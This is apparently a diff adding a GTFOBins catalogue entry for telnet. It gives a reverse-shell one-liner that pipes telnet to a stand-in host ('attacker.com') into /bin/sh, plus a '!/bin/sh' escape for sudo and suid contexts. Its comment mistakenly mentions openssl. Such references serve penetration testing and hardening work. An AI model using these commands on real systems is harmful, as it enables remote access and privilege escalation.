@@ -1,0 +1,23 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/telnet -->
+---
+functions:
+  reverse-shell:
+  - code: |-
+      mkfifo /path/to/temp-socket
+      telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
+    comment: |-
+      The shell process is not spawn by `openssl`.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      telnet
+      !/bin/sh
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
